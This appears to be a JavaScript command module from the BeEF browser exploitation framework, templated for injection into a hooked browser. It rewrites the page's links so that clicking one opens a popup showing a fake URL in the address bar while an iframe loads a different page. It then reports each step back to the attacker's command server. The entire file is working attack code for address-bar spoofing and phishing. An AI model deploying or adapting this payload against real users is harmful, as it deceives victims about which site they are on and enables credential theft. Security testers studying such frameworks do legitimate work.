//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//

var somethingsomething = function() {
	var fake_url = "<%= @fake_url %>";
	var real_url = "<%= @real_url %>";

	var newWindow = window.open(fake_url,'newWindow<%= @command_id %>','width=200,height=100,location=yes');
	newWindow.document.write('<iframe style="width:100%;height:100%;border:0;padding:0;margin:0;" src="' + real_url + '"></iframe>');
	newWindow.focus();
	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Spoofed link clicked');	
}

beef.execute(function() {

	$j('<%= @domselectah %>').each(function() {
		$j(this).attr('href','#').click(function() {
			somethingsomething();
			return true;
		});
	});

	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=All links rewritten');

});